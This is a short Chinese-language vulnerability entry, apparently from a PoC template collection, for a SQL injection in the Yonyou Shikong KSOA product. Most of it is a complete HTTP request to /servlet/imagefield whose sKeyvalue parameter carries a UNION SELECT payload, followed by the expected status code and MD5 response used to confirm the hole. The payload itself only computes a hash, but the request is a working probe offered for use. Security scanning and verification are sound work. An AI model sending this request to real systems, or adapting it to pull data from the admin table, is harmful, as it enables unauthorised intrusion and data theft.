﻿# 用友时空KSOA SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：098f6bcd4621d373cade4e832627b4f6

> 上传文件定位：

> 验证文件来源：用友时空KSOA SQL注入漏洞.poc
